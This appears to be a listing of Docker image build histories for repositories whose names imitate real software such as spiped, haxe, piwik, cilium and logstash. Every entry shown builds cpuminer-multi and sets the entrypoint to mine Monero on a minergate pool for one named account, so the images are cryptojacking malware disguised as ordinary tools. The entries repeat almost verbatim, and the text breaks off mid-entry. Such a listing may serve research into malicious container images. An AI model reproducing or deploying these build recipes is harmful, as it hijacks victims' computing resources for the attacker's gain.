/run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ljurfreealtgencom/spiped; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
jejagazkekitacom/haxe; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xelivcrusthostcom/july; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ibnrtvchdcom/piwik; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
icprmaildxcom/influx; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
nsssuacrocom/cilium; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ibrstoonml/logstash; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
nwqstvchdcom/agent; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xynrucupdongml/july; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
vexitapirmorsincom/july; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
luhogeronracom/upsource; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
cugutnezdiroorg/july; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
icrshezllcom/notifier; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache 